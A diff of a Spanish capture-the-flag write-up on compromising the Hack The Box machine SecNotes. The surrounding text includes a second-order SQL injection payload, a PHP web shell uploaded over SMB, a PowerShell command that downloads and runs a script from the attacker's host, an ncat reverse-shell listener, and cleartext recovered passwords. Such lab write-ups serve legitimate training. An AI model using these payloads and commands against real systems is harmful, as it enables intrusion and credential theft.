@@ -28,7 +28,7 @@ Su tarjeta de presentación es:
 
 Comenzamos por escanear todos los puertos TCP abiertos en la maquina, con la finalidad de poder encontrar los servicios ejecutándose en la maquina:
 
-```
+``` text
 root@kali:~# nmap -sS -p- -n --open 10.10.10.97
 Starting Nmap 7.70 ( https://nmap.org ) at c 12:15 CST
 Nmap scan report for 10.10.10.97
@@ -45,7 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 428.05 seconds
 
 Como backup ejecutamos masscan para verificar que sean los mismos puertos encontrados:
 
-```
+``` text
 root@kali:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.97
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-07 18:45:28 GMT
@@ -61,7 +61,7 @@ Discovered open port 8808/tcp on 10.10.10.97
 
 Al finalizar el escaneo, procedemos a volver a ejecutar un nmap con la finalidad de identificar los banners de los servicios descubiertos:
 
-```
+``` text
 root@kali:~# nmap -p80,445,8808 -sV -sC 10.10.10.97 -n -Pn
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-07 12:55 CST
 Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
@@ -117,7 +117,7 @@ Encontramos que el banner ha podido identificar que la maquina es un Windows 10,
 
 Ejecutamos un ataque de fuerza bruta a las carpetas y archivos del servidor Web mediante gobuster:
 
-```
+``` text
 root@kali:~/htb/secnotes# gobuster -u http://10.10.10.97/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x txt,php -t 20
 
 =====================================================
@@ -150,7 +150,7 @@ Al finalizar, podemos observar que hemos encontrado algunas paginas php por lo q
 
 Comenzamos por ir a "home" /:
 
-```
+``` text
 root@kali:~/htb/secnotes# http http://10.10.10.97
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -167,7 +167,7 @@ X-Powered-By: PHP/7.2.7
 
 Nos redirecciona a la pagina login, por lo que cambiamos la petición:
 
-```
+``` text
 root@kali:~/htb/secnotes# http http://10.10.10.97/login.php
 HTTP/1.1 200 OK
 Content-Length: 1223
@@ -215,7 +215,7 @@ X-Powered-By: PHP/7.2.7
 
 Podemos observar un form para loggearnos y un párrafo abajo indicándonos que podemos registrarnos. Como no tenemos credenciales ni tenemos mas información relevante, vamos a registrarnos para ver hasta que nivel tenemos información:
 
-```
+``` text
 root@kali:~/htb/secnotes# http http://10.10.10.97/register.php
 HTTP/1.1 200 OK
 Content-Length: 1569
@@ -268,7 +268,7 @@ X-Powered-By: PHP/7.2.7
 
 La pagina de register.php nos pide unicamente que seleccionemos un usuario, una contraseña y ya. Ingresemos este form y creemos un usuario para tener una cookie valida:
 
-```
+``` text
 root@kali:~/htb/secnotes# http --form http://10.10.10.97/register.php username=sdfsdf password=sdfsdfsdf confirm_password=sdfsdfsdf
 HTTP/1.1 302 Found
 Content-Length: 1593
@@ -322,7 +322,7 @@ X-Powered-By: PHP/7.2.7
 
 Tan pronto enviamos los valores del form, tenemos un 302 que nos regresa a login. Esto quiere decir que probablemente las credenciales ingresadas fueron validas y que ahora podemos usarlas. Intentemos ingresar con las credenciales:
 
-```
+``` text
 root@kali:~/htb/secnotes# http --form http://10.10.10.97/login.php username=sdfsdf password=sdfsdfsdf
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -374,7 +374,7 @@ X-Powered-By: PHP/7.2.7
 
 Yei, ya tenemos otra redireccion a home y un Set-Cookie. Veamos que hay en home usando la cookie:
 
-```
+``` text
 root@kali:~/htb/secnotes# http http://10.10.10.97/home.php "Cookie: PHPSESSID=o3eun2na9f7kks1dd3t989me2m; path=/"
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -486,7 +486,7 @@ Ok, la teoría es la siguiente:
 
 Hay valores que son almacenados en las bases de datos que en ocasiones son llamados para despegar propiedades, tales como las notas, posts, etc., por ejemplo, Bienvenido usuario XXXX YYYY. Aprovechándonos de que podemos ingresar cualquier usuario (siempre y cuando este no exista previamente), lo que haremos es crear un usuario que con apellido sqli.
 
-```
+``` text
 root@kali:~/htb/secnotes# http --form http://10.10.10.97/register.php "username=miau' or '1'='1" password=miaumiau confirm_password=miaumiau
 HTTP/1.1 302 Found
 Content-Length: 1600
@@ -541,7 +541,7 @@ X-Powered-By: PHP/7.2.7
 
 Observamos que nos ha devuelto un 302 hacia login, bien. Continuemos ahora por ingresar en login usando nuestras credenciales:
 
-```
+``` text
 root@kali:~/htb/secnotes# http --form http://10.10.10.97/login.php "username=miau' or '1'='1" password=miaumiau
 HTTP/1.1 302 Found
 Cache-Control: no-store, no-cache, must-revalidate
@@ -594,7 +594,7 @@ X-Powered-By: PHP/7.2.7
 
 Great. Tenemos otro 302 hacia home. Usemos ahora el cookie para ver el home de nuestro `amigo' or '1'='1`
 
-```
+``` text
 root@kali:~/htb/secnotes# http http://10.10.10.97/home.php "Cookie: PHPSESSID=v5er5q1ku6rj1l0vadfrn99nnh; path=/"
 HTTP/1.1 200 OK
 Cache-Control: no-store, no-cache, must-revalidate
@@ -754,7 +754,7 @@ Perfecto las primeras credenciales!
 
 Ahora que tenemos al usuario tyler y una contraseña, probemos otro servicio que acepta usuarios y contraseñas... smb:
 
-```
+``` text
 root@kali:~/htb/secnotes# smbclient -U tyler -c 'dir' //10.10.10.97/new-site/ '92g!mA8BGjOirkL%OG*&'
   .                                   D        0  Mon Jan  7 17:18:24 2019
   ..                                  D        0  Mon Jan  7 17:18:24 2019
@@ -782,7 +782,7 @@ Y también un ncat en el puerto 3001 para recibir la conexión:
 Ahora si, llamemos a esa shell:
 
 
-```
+``` text
 root@kali:~/htb/secnotes# smbclient -U tyler -c 'put 95456uyjdfg.php' //10.10.10.97/new-site/ '92g!mA8BGjOirkL%OG*&' && http 'http://10.10.10.97:8808/95456uyjdfg.php?cmd=powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.13.141:4001/s.ps1\")"'
 putting file 95456uyjdfg.php as \95456uyjdfg.php (0.2 kb/s) (average 0.2 kb/s)
 
@@ -791,7 +791,7 @@ http: error: Request timed out (30s).
 
 En la otra shell:
 
-```
+``` text
 root@kali:~/htb/secnotes# ncat -lvnp 3001
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::3001
@@ -878,7 +878,7 @@ Ok, comencemos el camino hasta root.txt...
 
 Vamos a `c:\`
 
-```
+``` text
 PS C:\> ls
 
 
@@ -903,7 +903,7 @@ Interesante, el archivo Ubuntu.zip y la carpeta "Distros"... Eso parece una refe
 
 Tras probar que el binario de bash.exe si existe me aventure a ir a la carpeta /root directamente en busqueda de una flag:
 
-```
+``` text
 PS C:\Distros> bash -c 'ls -lah /root'
 total 8.0K
 drwx------ 1 root root  512 Jun 22  2018 .
@@ -916,7 +916,7 @@ drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
 
 Desafortunadamente no encontre root.txt ... y después de un buen rato tratando de investigar que hacer en este pot, intente leer el archivo .bash_history (si, aquel con esas propiedades extrañas de permisos que no tiene size 0!!!)
 
-```
+``` text
 PS C:\Distros> bash -c 'cat /root/.bash_history'
 cd /mnt/c/
 ls
@@ -950,7 +950,7 @@ o/ hi administrator!
 
 Ok, proveemos las credenciales que acabamos de encontrar:
 
-```
+``` text
 root@kali:~/htb/secnotes# smbclient -U Administrator //10.10.10.97/c$/ 'u6!4ZwgwOM#^OBf#Nwnh'
 Try "help" to get a list of possible commands.
 smb: \> dir
